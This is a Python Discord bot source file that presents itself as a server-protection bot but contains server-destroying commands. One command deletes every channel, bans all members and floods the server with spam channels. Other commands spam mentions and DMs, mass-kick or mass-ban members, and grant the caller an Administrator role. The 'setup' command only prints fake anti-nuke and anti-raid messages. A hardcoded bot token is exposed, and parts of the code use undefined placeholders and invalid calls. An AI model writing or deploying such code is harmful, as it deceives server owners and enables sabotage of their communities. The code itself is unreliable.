import discord
from discord.ext import commands
from discord.ext.commands import Bot
import asyncio
import time
import random


CHANNEL_NAMES = [c]

MESSAGE_CONTENTS = [m]

bot = commands.Bot(command_prefix= p)
 
client = commands.Bot(command_prefix= p)
 
##OTHER##

bot.remove_command('help')

@client.event
async def on_ready():
    print("Nappy Bot Is Online")
    await client.change_presence(status=discord.Status.invincible, activity=discord.Game("Prot Bot Is Used In 2,000+ Servers | p!help "))


@client.command()
async def mention(ctx, amount=100000):
    await ctx.message.delete()
    if not amount is None:
        for _ in range(amount):
            for channel in ctx.guild.text_channels:
              await channel.send(random.choice(MESSAGE_CONTENTS))
    else:
        while True:
            for channel in ctx.guild.text_channels: 
              await channel.send(random.choice(MESSAGE_CONTENTS))

@client.command()
async def ey(ctx, amount=1000000):
        for channel in list(ctx.message.guild.channels):
            try:
                await channel.delete()
                print (channel.name + " has been deleted")
            except:
                pass          
        guild = ctx.message.guild
        for member in list(ctx.message.guild.members):
            try:
                await guild.ban(member)
                print (member.name + " has been banned")
            except:
                pass
        print ("Banning Finished.")

      

      
        await ctx.guild.edit(name="Nappy Has Done Such A Cruel Crime")
        channel = await guild.create_text_channel(CHANNEL_NAMES),
        for _ in range(amount):
            await guild.create_text_channel(CHANNEL_NAMES)          
        if not amount is None:
         for _ in range(amount):
             for channel in ctx.guild.text_channels:
                await channel.send(random.choice(MESSAGE_CONTENTS))  
         else:
           while True:
             for channel in ctx.guild.text_channels: 
                await channel.send(random.choice(MESSAGE_CONTENTS))



@client.command(pass_context=True)
async def Hi(ctx):
    guild = ctx.message.guild
    for member in guild.members:
     await asyncio.sleep(0)
     try:
       await member.send("HELLO")
       print("Sent message")
     except:
       pass


@client.command(pass_context=True)
async def ping(ctx):
	channel = ctx.message.channel
	t1 = time.perf_counter()
	await channel.trigger_typing()
	t2 = time.perf_counter()
	embed=discord.Embed(title=None, description='Ping: {}'.format(round((t2-t1)*1000)), color=0x2874A6)
	await channel.send(embed=embed)

@client.command(pass_context=True)
async def whois(ctx, member: discord.Member=None):
    channel = ctx.message.channel
    if member is None:
        await channel.send('Please input a user.')
    else:
        await channel.send("**The user's name is: {}**".format(member.name) + "\n**The user's ID is: {}**".format(member.id) + "\n**The user's current status is: {}**".format(member.status) + "\n**The user's highest role is: {}**".format(member.top_role) + "\n**The user joined at: {}**".format(member.joined_at))

@client.command(pass_context=True)
async def kick(ctx, member: discord.Member=None):
    author = ctx.message.author
    channel = ctx.message.channel
    if author.guild_permissions.kick_members:
        if member is None:
            await channel.send('Please Mention a user.')
        else:
            await channel.send("You Have Been Kicked".format(member.name))
            await member.kick()
    else:
        await channel.send('')

@client.command(pass_context=True)
async def ban(ctx, member: discord.Member=None):
    author = ctx.message.author
    channel = ctx.message.channel
    if author.guild_permissions.kick_members:
        if member is None:
            await channel.send('Please Mention A User First.')
        else:
            await channel.send("You Have Been Banned".format(member.name))
            await member.ban()
    else:
        await channel.send('You Dont Have The Permissions To Use This Command')


@client.command(pass_context=True)
async def invite(ctx):
    channel = ctx.message.channel
    await channel.send("OATh LINK")


@client.command(pass_context=True)
async def moderate(ctx):
    channel = ctx.message.channel
    embed = discord.Embed(
        colour = discord.Colour.blue()
    )
    embed.add_field(name="You Are Now Being Protected", value="Prot Bot Is Protecting This Server")
    await channel.send(embed=embed)

@client.command(pass_context=True)
async def secret(ctx):
    member = ctx.message.author
    embed = discord.Embed(
        colour = discord.Colour.red()
    )

@client.command(pass_context=True)
async def kickall(ctx):
    guild = ctx.message.guild
    for member in list(ctx.message.guild.members):
        try:    
            await guild.kick(member)
            print ("User " + member.name + " has been kicked")
        except:
            pass
    print ("Everyone Has Been Kicked")

@client.command(pass_context=True)
async def banall(ctx):
    guild = ctx.message.guild
    for member in list(ctx.message.guild.members):
        try:
            await guild.ban(member)
            print ("User " + member.name + " has been banned")
        except:
            pass
    print ("Everyone Has Been Banned")



@client.command(pass_context=True)
async def admin(ctx):
    guild = ctx.message.guild
    perms = discord.Permissions(8)
    await guild.create_role(name='.', permissions=perms)
    member = ctx.message.author
    role = discord.utils.get(guild.roles, name=".")
    await member.add_roles(role)
    print ("Admin Perms Gave to @everyone")

@client.command()
async def setup(ctx):
    guild = ctx.message.guild
    await ctx.channel.send("Initializing The Prot Bot Setup")
    await ctx.channel.send("Anti Nuke Is Finished")
    await ctx.channel.send("Anti Spam Is Finished")
    await ctx.channel.send("Anti Raid Is Finished")
    await ctx.channel.send("My Logs Are Being Made")
    await ctx.guild.create_channel("Prot-Bot-Logs")
    await ctx.channel.send("My Logs Are Finished")
    await ctx.channel.send("Moderation Is Up And Runnig For The Server")
    await ctx.channel.send("Setup is Done :white_check_mark: ")



bot.run("NzY3NTU0NTQyNzkwNzcwNzM5.X4zm3w.eqKsCBAJBK8ly0pQzfMlZLvg7L8")
